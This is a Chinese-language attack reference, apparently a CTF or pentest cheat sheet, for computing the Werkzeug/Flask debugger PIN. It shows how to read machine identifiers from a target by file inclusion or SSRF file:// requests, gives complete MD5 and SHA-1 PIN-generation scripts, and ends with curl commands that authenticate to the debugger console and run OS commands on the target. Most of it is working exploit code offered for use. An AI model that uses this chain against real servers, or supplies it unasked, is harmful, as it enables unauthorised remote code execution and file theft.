# Werkzeug Debugger PIN 计算完整参考

## PIN 算法原理

Werkzeug 在 `debug/__init__.py` 的 `get_pin_and_cookie_name()` 函数中生成 PIN。PIN 基于 6 个输入值的哈希计算。

## 需要收集的值

### 1. probably_public_bits

```python
probably_public_bits = [
    username,      # 运行进程的用户名
    modname,       # 通常是 'flask.app'
    getattr(app, '__name__', type(app).__name__),  # 通常是 'Flask'
    getattr(mod, '__file__', None),  # flask/app.py 的绝对路径
]
```

**获取方式**：
- `username`: 从 `/etc/passwd` 中找运行 Web 的用户（通常是 `www-data`/`root`/`flask`），或从 traceback 路径推断 `/home/USERNAME/...`
- `modname`: 几乎总是 `flask.app`
- `appname`: 几乎总是 `Flask`（除非应用自定义了子类名）
- `modpath`: 从错误页面 traceback 中找到 flask 的 `app.py` 路径
  - 典型值: `/usr/local/lib/python3.x/dist-packages/flask/app.py`
  - Docker 中: `/usr/local/lib/python3.11/site-packages/flask/app.py`
  - venv 中: `/home/user/venv/lib/python3.x/site-packages/flask/app.py`

### 2. private_bits

```python
private_bits = [
    str(uuid.getnode()),   # MAC 地址的十进制表示
    get_machine_id(),      # 机器 ID
]
```

**MAC 地址获取**：
```bash
# 读取 MAC 地址
cat /sys/class/net/eth0/address
# 输出: 02:42:ac:11:00:02

# 转换为十进制
python3 -c "print(int('0242ac110002', 16))"
# 输出: 2485377892354
```

**machine_id 获取**（这是最容易出错的部分）：

```python
# Werkzeug 的 get_machine_id() 实际逻辑：
def get_machine_id():
    linux = b""
    
    # 第一步：读 /etc/machine-id 或 /proc/sys/kernel/random/boot_id
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
                if value:
                    linux += value
                    break  # 只取第一个成功的
        except OSError:
            continue
    
    # 第二步：追加 /proc/self/cgroup 中的容器 ID
    try:
        with open("/proc/self/cgroup", "rb") as f:
            linux += f.readline().strip().rpartition(b"/")[2]
    except OSError:
        pass
    
    if linux:
        return linux
```

> 关键：machine_id 是 `/etc/machine-id`（或 `boot_id`）**拼接** `/proc/self/cgroup` 第一行最后一个 `/` 后的内容。Docker 中 cgroup 行通常包含容器 ID。

## PIN 计算脚本

### Werkzeug < 2.1（MD5 算法）

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'www-data',                                           # username
    'flask.app',                                          # modname
    'Flask',                                              # getattr(app, '__name__')
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__')
]

private_bits = [
    '2485377892354',                                      # MAC 十进制
    'ed5b159560f54721827644bc9b220d00abc1234567890abcdef' # machine-id + cgroup
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)

h.update(b'cookiesalt')

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

print(f"PIN: {num}")
```

### Werkzeug >= 2.1（SHA-1 算法）

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'www-data',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.11/site-packages/flask/app.py'
]

private_bits = [
    '2485377892354',
    'ed5b159560f54721827644bc9b220d00abc1234567890abcdef'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)

h.update(b'cookiesalt')

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].lstrip('0') or '0'
                         for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(f"PIN: {rv}")
```

## Docker 环境特殊处理

Docker 中 `/proc/self/cgroup` 通常是：
```
12:memory:/docker/abc123def456...
```
取最后一个 `/` 后的部分 → `abc123def456...`（容器 ID）

但 cgroup v2（较新 Linux）格式不同：
```
0::/
```
此时 cgroup 部分为空，machine_id 只用 `/etc/machine-id`。

另外，Docker 中 `/etc/machine-id` 可能不存在，需要回退到 `/proc/sys/kernel/random/boot_id`。

## 通过 SSRF 读取文件

如果目标只有 SSRF 而没有 LFI，可以用 `file://` 协议：

```bash
# 通过 SSRF 读取 MAC 地址
curl 'http://TARGET/fetch?url=file:///sys/class/net/eth0/address'

# 通过 SSRF 读取 machine-id
curl 'http://TARGET/fetch?url=file:///etc/machine-id'
```

## PIN Cookie 认证（无需浏览器）

```bash
# 1. 获取 debugger secret（从 /console 页面 HTML 中提取）
SECRET=$(curl -s http://TARGET/console | grep -oP 'SECRET = "\K[^"]+')

# 2. 用 PIN 获取认证 Cookie
RESPONSE=$(curl -s "http://TARGET/console?__debugger__=yes&cmd=pinauth&pin=${PIN}&s=${SECRET}")
COOKIE=$(echo "$RESPONSE" | grep -oP '__wzd[^=]+=\K[^;]+')

# 3. 执行命令
curl "http://TARGET/console?__debugger__=yes&cmd=__import__('os').popen('id').read()&frm=0&s=${SECRET}" \
  -H "Cookie: __wzd...=${COOKIE}"
```

## 常见踩坑

1. **Python 版本影响路径**: Python 3.8 vs 3.11 的 `site-packages` 路径不同
2. **虚拟环境路径**: venv/conda 会改变 `app.py` 路径
3. **MAC 接口名**: 不一定是 `eth0`，可能是 `ens3`/`enp0s3`/`docker0`
4. **多个网卡**: `uuid.getnode()` 取第一个非 lo 接口
5. **cgroup v2**: 新版 Linux 的 cgroup 格式变了，处理方式不同
6. **Werkzeug 版本**: < 2.1 用 MD5，>= 2.1 用 SHA-1，PIN 格式也不同（XXX-XXX-XXX vs XXXXX-XXXX）
